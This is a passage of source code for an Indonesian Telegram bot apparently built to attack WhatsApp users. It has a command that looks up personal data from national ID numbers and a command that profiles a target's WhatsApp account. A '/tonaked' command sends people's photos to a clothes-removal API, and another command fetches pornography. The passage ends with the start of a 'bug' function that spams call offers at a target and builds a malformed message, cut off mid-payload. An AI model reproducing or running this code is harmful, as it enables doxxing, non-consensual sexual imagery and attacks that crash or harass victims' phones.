      "☇ Gunakan perintah : `/anime <judul anime>`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const apiUrl =
      `https://api.jikan.moe/v4/anime?q=${encodeURIComponent(query)}&limit=1`;

    const res = await fetch(apiUrl);
    const json = await res.json();

    if (!json || !Array.isArray(json.data) || json.data.length === 0) {
      return ctx.reply("❌ Tidak Menemukan Daftar Anime dengan judul tersebut.");
    }

    const anime = json.data[0];

    const title = anime.title || "-";
    const type = anime.type || "-";
    const episodes = anime.episodes ?? "?";
    const status = anime.status || "-";
    const score = anime.score ?? "N/A";
    const malUrl = anime.url || "-";
    const imageUrl = anime.images?.jpg?.image_url;
    const synopsis = anime.synopsis
      ? anime.synopsis.slice(0, 400) + (anime.synopsis.length > 400 ? "..." : "")
      : "Tidak ada sinopsis.";

    const caption = `\`\`\`
⧂ BERIKUT DATA ANIME
\`\`\`
☇ Title : ${title}
☇ Type : ${type}
☇ Episode : ${episodes}
☇ Skor : ${score}
☇ Status : ${status}
☇ Sinopsis : ${synopsis}
☇ Link : [MyAnimeList](${malUrl})
`;

    if (imageUrl) {
      await ctx.replyWithPhoto(imageUrl, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☇ Cari Lagi", switch_inline_query_current_chat: "/anime " }]
          ]
        }
      });
    } else {
      await ctx.reply(caption, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error("Anime Error:", err);
    ctx.reply("⚠️ Yah Tidak Ada Data, Dengan Anime Yang Kamu Cari");
  }
});

bot.command('nikparse', async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const args = ctx.message.text.split(' ').slice(1);
  const nik = args[0]?.trim();

  if (!nik) return ctx.reply("🪧 ☇ Format: /nikparse 1234567890123456");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const waitMsg = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK...");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote><pre>⬡⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰⬡</pre></blockquote>

⌑ NIK
╰❁ ${get(d.nik) || nik}

⌑ Nama
╰❁ ${get(d.nama)}

⌑ Jenis Kelamin
╰❁ ${get(d.jenis_kelamin || d.gender)}

⌑ Tempat Lahir
╰❁ ${get(d.tempat_lahir || d.tempat)}

⌑ Tanggal Lahir
╰❁ ${get(d.tanggal_lahir || d.tgl_lahir)}

⌑ Umur
╰❁ ${get(d.umur)}

⌑ Provinsi
╰❁ ${get(d.provinsi || d.province)}

⌑ Kabupaten/Kota
╰❁ ${get(d.kabupaten || d.kota || d.regency)}

⌑ Kecamatan
╰❁ ${get(d.kecamatan || d.district)}

⌑ Kelurahan/Desa
╰❁ ${get(d.kelurahan || d.village)}
`;

    return ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: true
    });
  };

  try {
    const res = await axios.get(`https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000
    });

    const data =
      res.data?.data ||
      res.data?.result ||
      res.data ||
      null;

    if (data && typeof data === "object" && Object.keys(data).length > 0) {
      await replyHTML(data);
    } else {
      await ctx.reply("❌ ☇ NIK tidak ditemukan di database");
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Gagal menghubungi API, coba lagi nanti");
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command('tourl', async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const replyMsg = ctx.message.reply_to_message;
  
   if (systemLocked) {
   return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!replyMsg) {
    return ctx.reply("🪧 ☇ Format: /tourl (reply dengan foto atau video)");
  }

  let fileId = null;
  if (replyMsg.photo && replyMsg.photo.length) {
    fileId = replyMsg.photo[replyMsg.photo.length - 1].file_id;
  } else if (replyMsg.video) {
    fileId = replyMsg.video.file_id;
  } else if (replyMsg.video_note) {
    fileId = replyMsg.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const waitMsg = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke Catbox...");

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${ctx.telegram.token}/${file.file_path}`;

    const uploadedUrl = await uploadToCatbox(fileLink);

    if (typeof uploadedUrl === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(uploadedUrl.trim())) {
      await ctx.reply(uploadedUrl.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke Catbox.\n" + String(uploadedUrl).slice(0, 200));
    }
  } catch (e) {
    const msgError = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke Catbox`
      : "❌ ☇ Gagal unggah, coba lagi.";
    await ctx.reply(msgError);
  } finally {
    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}
  }
});

bot.command("bokep", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;
  
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  // validasi dasar
  if (!chatId || !text) return;

  const args = text.split(" ").slice(1).join(" ").trim();
  if (!args) {
    return ctx.reply("🪧 Gunakan: /bokep <kata kunci>", {
      reply_to_message_id: msgId,
    }).catch(() => {});
  }

  let loadingMsg;

  try {
    // ===== kirim pesan loading =====
    loadingMsg = await ctx.reply(
      `⏳ Mencari video...\n🔍 Kata kunci: ${args}`,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    );

    const editMessage = async (newText) => {
      try {
        await ctx.telegram.editMessageText(
          chatId,
          loadingMsg.message_id,
          undefined,
          newText,
          { parse_mode: "Markdown" }
        );
      } catch (e) {
        console.log("⚠️ Gagal edit pesan:", e.message);
      }
    };

    // ===== cari video =====
    await editMessage(`🔍 *Mencari video...*\nKata kunci : ${args}`);

    const res = await fetch(
      `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(args)}`
    );
    if (!res.ok) throw new Error(`Gagal ambil data pencarian (${res.status})`);

    const data = await res.json().catch(() => ({}));
    if (!data.status || !Array.isArray(data.result) || !data.result.length) {
      return editMessage(`⚠️ Tidak ada hasil ditemukan untuk: ${args}`);
    }

    const top = data.result[0];
    const title = top.title || args;
    const link = top.link;

    // ===== ambil detail =====
    await editMessage(`⌛ Mengambil detail video...\n⎙ Judul : ${title}`);

    const dlRes = await fetch(
      `https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(link)}`
    );
    if (!dlRes.ok) throw new Error(`Gagal ambil detail (${dlRes.status})`);

    const dlData = await dlRes.json().catch(() => ({}));
    const high = dlData?.result?.files?.high;

    if (!high) {
      return editMessage(`⚠️ Video tidak memiliki kualitas High (HD)\n⎙ Judul : ${title}`);
    }

    // ===== download video =====
    await editMessage(`⌭ Mengunduh video...\n⎋ Resolusi : High`);

    const videoRes = await fetch(high);
    if (!videoRes.ok) throw new Error(`Gagal unduh file video (${videoRes.status})`);

    const buffer = Buffer.from(await videoRes.arrayBuffer());
    const filePath = path.join(process.cwd(), `temp_${Date.now()}.mp4`);
    fs.writeFileSync(filePath, buffer);

    // ===== kirim video =====
    await editMessage(`✅ Video ditemukan!\n⸙ Mengirim ke chat...`);
    await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    await ctx.replyWithVideo(
      { source: filePath },
      {
        caption:
`🎬 HASIL VIDEO BOKEP
⎙ Judul : ${title}
⎋ Resolusi : High`,
        reply_to_message_id: msgId,
        supports_streaming: true,
      }
    );

    fs.unlinkSync(filePath);
  } catch (e) {
    console.error("❌ Error /bokep:", e);
    if (loadingMsg) {
      await ctx.telegram.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
    }
    await ctx.reply(
      `❌ Terjadi kesalahan saat mengambil data\n\n\`\`\`${e.message}\`\`\``,
      { reply_to_message_id: msgId, parse_mode: "Markdown" }
    ).catch(() => {});
  }
});

bot.command("ssip", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const textMsg = ctx.message?.text;
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!chatId || !textMsg) return;

  const input = textMsg.split(" ").slice(1).join(" ").trim();

  // ===== validasi input =====
  if (!input) {
    return ctx.reply(
      "🪧 Format salah.\n\nContoh:\n`/ssip Name | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "TELKOMSEL";

  const apiUrl =
    `https://brat.siputzx.my.id/iphone-quoted?` +
    `time=${encodeURIComponent(time)}` +
    `&messageText=${encodeURIComponent(text)}` +
    `&carrierName=${encodeURIComponent(carrier)}` +
    `&batteryPercentage=${encodeURIComponent(battery)}` +
    `&signalStrength=4&emojiStyle=apple`;

  try {
    // ===== chat action =====
    await ctx.telegram.sendChatAction(chatId, "upload_photo").catch(() => {});

    // ===== ambil gambar =====
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    // ===== kirim foto =====
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption:
`「 ⚆ 」IPhone Generate
Chat : \`${text}\`
Time : ${time}
Baterry : ${battery}%
Kartu : ${carrier}`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "「 αµƭɦσɾ 」", url: "https://t.me/XavienZzTamvan" }]
          ]
        },
        reply_to_message_id: msgId
      }
    );
  } catch (e) {
    console.error("❌ Error /ssip:", e.message);
    await ctx.reply(
      "❌ Terjadi kesalahan saat memproses gambar.",
      { reply_to_message_id: msgId }
    ).catch(() => {});
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
  const chatId = ctx.chat?.id;
  const msgId = ctx.message?.message_id;
  const text = ctx.message?.text;

    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!chatId || !text) return;

  const keyword = text.split(" ").slice(1).join(" ").trim();

  if (!keyword) {
    return ctx.reply(
      "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
      { parse_mode: "Markdown", reply_to_message_id: msgId }
    ).catch(() => {});
  }

  let loading;
  try {
    loading = await ctx.reply("⸙ SEARCHING VIDEO TIKTOK......");

    const searchUrl =
      `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(keyword)}&count=5`;

    const res = await axios.get(searchUrl, { timeout: 20000 });
    const data = res.data;

    const videos =
      data?.data?.videos ||
      data?.data?.list ||
      data?.data?.aweme_list ||
      data?.data ||
      [];

    if (!Array.isArray(videos) || videos.length === 0) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
      return ctx.reply("⚠️ Tidak ada hasil ditemukan untuk kata kunci tersebut.");
    }

    const topVideos = videos.slice(0, 5);
    const uniqueKey = Math.random().toString(36).slice(2, 10);
    tiktokCache.set(uniqueKey, topVideos);

    const keyboard = topVideos.map((v, i) => {
      const title = (v.title || "Tanpa Judul").slice(0, 35);
      return [
        {
          text: `${i + 1}. ${title}`,
          callback_data: `tiktok|${uniqueKey}|${i}`,
        },
      ];
    });

    await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    await ctx.reply(
      `⸙ Ditemukan *${topVideos.length}* hasil untuk:\n\`${keyword}\`\nPilih salah satu video di bawah ini:`,
      {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard },
      }
    );
  } catch (e) {
    console.error("❌ TikTok Search Error:", e.message);
    if (loading) {
      await ctx.telegram.deleteMessage(chatId, loading.message_id).catch(() => {});
    }
    await ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.").catch(() => {});
  }
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery?.data;
  const chatId = ctx.chat?.id;

  if (!data || !data.startsWith("tiktok|")) return;

  await ctx.answerCbQuery("⏳ MENGUNDUH VIDEO SABAR LOADING.....").catch(() => {});

  const [, cacheKey, indexStr] = data.split("|");
  const index = parseInt(indexStr, 10);

  const cached = tiktokCache.get(cacheKey);
  if (!cached || !cached[index]) {
    return ctx.reply("⚠️ Data video tidak ditemukan (cache kedaluwarsa).").catch(() => {});
  }

  const v = cached[index];
  const author =
    v.author?.unique_id ||
    v.author?.nickname ||
    v.user?.unique_id ||
    "unknown";

  const videoId =
    v.video_id ||
    v.id ||
    v.aweme_id ||
    v.short_id ||
    v.video?.id;

  const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

  try {
    const res = await axios.post(
      "https://www.tikwm.com/api/",
      `url=${encodeURIComponent(tiktokUrl)}`,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        },
        timeout: 30000,
      }
    );

    const result = res.data;
    if (!result || result.code !== 0 || !result.data) {
      throw new Error("Video tidak valid");
    }

    const vid = result.data;
    const videoUrl =
      vid.play || vid.hdplay || vid.wmplay || vid.play_addr;

    const caption =
`☀ Trevosium Searching
Video : *${vid.title || "Video TikTok"}*
Author : @${vid.author?.unique_id || "unknown"}
Likes : ${vid.digg_count || 0}
Comment : ${vid.comment_count || 0}
[🌐 Lihat di TikTok](${tiktokUrl})`;

    await ctx.replyWithVideo(videoUrl, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error("❌ Gagal download:", e.message);
    await ctx.reply("⚠️ Gagal mengunduh video TikTok.").catch(() => {});
  }
});

bot.command("toanime", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;
  
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /toanime"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar ke mode Anime...")
    .catch(() => null);
    
   try {
    // ===== API anime =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/anime?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴛʀᴇᴠᴏꜱɪᴜᴍ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /toanime error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tonaked", async (ctx) => {
  const chatId = ctx.chat?.id;
  const userId = ctx.from?.id;
  const pengirim = ctx.from;
  
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!chatId || !userId) return;

  const text = ctx.message?.text || "";
  const urlArg = text.split(" ").slice(1).join(" ").trim();

  let imageUrl = urlArg || null;

  // ===== ambil foto dari reply =====
  if (!imageUrl && ctx.message?.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.slice(-1)[0];
    try {
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      imageUrl = fileLink.href;
    } catch {
      imageUrl = null;
    }
  }

  if (!imageUrl) {
    return ctx.reply(
      "⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tonaked"
    ).catch(() => {});
  }

  const status = await ctx.reply("⌭ Memproses gambar...")
    .catch(() => null);

  try {
    // ===== panggil API =====
    const res = await fetch(
      `https://api.nekolabs.web.id/style-changer/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json().catch(() => ({}));
    const hasil = data?.result || null;

    if (!hasil) {
      if (status) {
        await ctx.telegram.editMessageText(
          chatId,
          status.message_id,
          undefined,
          "⎈ Gagal memproses gambar. Pastikan URL atau foto valid."
        ).catch(() => {});
      }
      return;
    }

    if (status) {
      await ctx.telegram.deleteMessage(chatId, status.message_id).catch(() => {});
    }

    await ctx.replyWithPhoto(hasil, {
      caption:
`⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
⎙ ɢᴀᴍʙᴀʀ ʙᴇʀʜᴀsɪʟ ᴅɪᴘʀᴏsᴇs ᴛʀᴇᴠᴏꜱɪᴜᴍ`,
      parse_mode: "Markdown",
    }).catch(() => {});
  } catch (e) {
    console.error("❌ /tonaked error:", e.message);
    if (status) {
      await ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        undefined,
        "⎈ Terjadi kesalahan saat memproses gambar."
      ).catch(() => {});
    }
  }
});

bot.command("tofigure", async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const pengirim = ctx.from;
    const text = ctx.message.text || "";
    const args = text.split(" ").slice(1).join(" ").trim();
    
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

    let imageUrl = args || null;

    if (!imageUrl && ctx.message.reply_to_message?.photo) {
      const photo = ctx.message.reply_to_message.photo;
      const fileId = photo[photo.length - 1].file_id;
      const fileLink = await ctx.telegram.getFileLink(fileId);
      imageUrl = fileLink.href;
    }

    if (!imageUrl) {
      return ctx.reply("⎈ Balas ke foto atau sertakan URL gambar setelah perintah /tofigure");
    }

    const status = await ctx.reply("⌭ Mengubah gambar ke mode Figure...");

    const res = await fetch(
      `https://api.nekolabs.web.id/style.changer/figure?imageUrl=${encodeURIComponent(imageUrl)}`,
      {
        method: "GET",
        headers: { accept: "*/*" },
      }
    );

    const data = await res.json();
    const hasil = data?.result;

    if (!hasil) {
      return ctx.telegram.editMessageText(
        chatId,
        status.message_id,
        null,
        "⎈ Gagal memproses gambar."
      );
    }

    await ctx.telegram.deleteMessage(chatId, status.message_id);

    await ctx.replyWithPhoto(hasil, {
      caption: `\`\`\`
⎙ Selesai
━━━━━━━━━━━━━
━━━【 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 𝙏𝙊𝙊𝙇𝙎 】━━━
⸎ Pengirim: ${pengirim.first_name}
\`\`\``,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    await ctx.reply("⎈ Terjadi kesalahan saat memproses gambar.");
  }
});

bot.command("getcode", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!url) {
      return ctx.reply("🪧 ☇ Format: /getcode https://example.com");
    }

    if (!/^https?:\/\/.+/i.test(url)) {
      return ctx.reply("❌ ☇ Url tidak valid!");
    }

    const loading = await ctx.reply("⏳ ☇ Tunggu sebentar...");

    // ===== HEAD CHECK =====
    let contentType = "";
    try {
      const headRes = await fetch(url, { method: "HEAD" });
      contentType = headRes.headers.get("content-type") || "";
    } catch {}

    const extMatch = url.match(/\.(\w+)$/i);
    const ext = extMatch ? extMatch[1].toLowerCase() : "";

    const isHTML =
      contentType.includes("text/html") ||
      ext === "html" ||
      ext === "";

    // ================= HTML WEBSITE =================
    if (isHTML) {
      const res = await fetch(url);
      const html = await res.text();

      const tmpDir = path.join("./tmp", `site-${Date.now()}`);
      fs.mkdirSync(tmpDir, { recursive: true });
      fs.writeFileSync(path.join(tmpDir, "index.html"), html);

      const $ = cheerio.load(html);
      const resources = new Set();

      $("link[href], script[src], img[src]").each((_, el) => {
        const attr = $(el).attr("href") || $(el).attr("src");
        if (!attr || attr.startsWith("data:")) return;

        try {
          resources.add(new URL(attr, url).href);
        } catch {}
      });

      for (const resUrl of resources) {
        try {
          const fileRes = await fetch(resUrl);
          if (!fileRes.ok) continue;

          const buffer = await fileRes.arrayBuffer();
          const name = path.basename(resUrl.split("?")[0]);
          fs.writeFileSync(path.join(tmpDir, name), Buffer.from(buffer));
        } catch {}
      }

      const zip = new AdmZip();
      zip.addLocalFolder(tmpDir);

      const zipPath = path.join("./tmp", `source-${Date.now()}.zip`);
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({
        source: zipPath,
        filename: "source.zip"
      });

      fs.rmSync(tmpDir, { recursive: true, force: true });
      fs.unlinkSync(zipPath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "✅ ☇ Website berhasil dikumpulkan & dikirim sebagai ZIP."
      );

    // ================= SINGLE FILE =================
    } else {
      const res = await fetch(url);
      if (!res.ok) throw new Error(`Status ${res.status}`);

      const buffer = await res.arrayBuffer();
      const extFile = ext || "txt";
      const fileName = `code-${Date.now()}.${extFile}`;

      fs.mkdirSync("./tmp", { recursive: true });
      const filePath = path.join("./tmp", fileName);
      fs.writeFileSync(filePath, Buffer.from(buffer));

      await ctx.replyWithDocument({
        source: filePath,
        filename: fileName
      });

      fs.unlinkSync(filePath);

      await ctx.telegram.editMessageText(
        chatId,
        loading.message_id,
        null,
        "☇ File tunggal berhasil diunduh dan dikirim."
      );
    }

  } catch (err) {
    console.error("GETCODE ERROR:", err);
    try {
      await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil source code.");
    } catch {}
  }
});

bot.command("brat", async (ctx) => {
  try {
    const textInput = ctx.message.text.split(" ").slice(1).join(" ").trim();
    const chatId = ctx.chat.id;
    
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!textInput) {
      return ctx.reply(
        "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n✘ Format salah!\n\n☬ Cara pakai:\n/brat teks\n\n⎙ Contoh:\n/brat Halo Dunia```",
        { parse_mode: "Markdown" }
      );
    }

    const loadingMsg = await ctx.reply(
      "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Membuat gambar teks...```",
      { parse_mode: "Markdown" }
    );

    const url = `https://brat.siputzx.my.id/image?text=${encodeURIComponent(textInput)}&emojiStyle=apple`;
    const res = await fetch(url);
    const buffer = Buffer.from(await res.arrayBuffer());

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Gambar teks berhasil dibuat.",
        parse_mode: "Markdown"
      }
    );

    ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

  } catch (e) {
    console.error("BRAT ERROR:", e);
    ctx.reply(
      "```⸙ 𝙏𝙍𝙀𝙑𝙊𝙎𝙄𝙐𝙈 — 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat gambar.```",
      { parse_mode: "Markdown" }
    );
  }
});

const playing = new Map();

bot.command("play", async (ctx) => {
  const chatId = ctx.chat.id;
  const reply = ctx.message.reply_to_message;
  
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    } 

  const query =
    ctx.message.text.replace(/^\/play\s*/i, "").trim() ||
    txt(reply);

  if (!query) {
    return ctx.reply("🎧 Ketik judul atau reply judul/link");
  }

  const infoMsg = await ctx.reply("🎧 Proses pencarian...");

  try {
    const isLink = /^https?:\/\/(youtube\.com|youtu\.be)/i.test(query);
    const candidates = isLink
      ? [{ url: query, title: query }]
      : await topVideos(query);

    if (!candidates.length) {
      return ctx.reply("❌ Tidak ada hasil ditemukan");
    }

    const ytUrl = normalizeYouTubeUrl(candidates[0].url);
    if (!ytUrl.includes("watch?v=")) {
      return ctx.reply("❌ Video YouTube tidak valid");
    }

    const apiUrl =
      "https://api.nekolabs.web.id/downloader/youtube/v1?" +
      new URLSearchParams({
        url: ytUrl,
        format: "mp3",
        quality: "128",
        type: "audio"
      });

    const res = await axios.get(apiUrl, { timeout: 60000 });
    const data = res.data;

    if (!data?.success || !data?.result?.downloadUrl) {
      return ctx.reply("❌ Gagal mengambil audio");
    }

    const file = await downloadToTemp(data.result.downloadUrl);
    await ctx.replyWithAudio(
      { source: file },
      {
        title: data.result.title,
        performer: "TREVOSIUM GHOST MUSIC",
        caption: `🎧 ${data.result.title}`
      }
    );

    cleanup(file);
    await ctx.deleteMessage(infoMsg.message_id).catch(() => {});

  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan saat memproses audio");
  }
});

// The Function Bugs

//====( Blank Documents )====\\

async function BorsOvas(sock, target) {
  try {
    await sock.offerCall(target);
  } catch (error) {}
  try {
    await sock.offerCall(target, { video: true });
  } catch (error) {}
  let msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
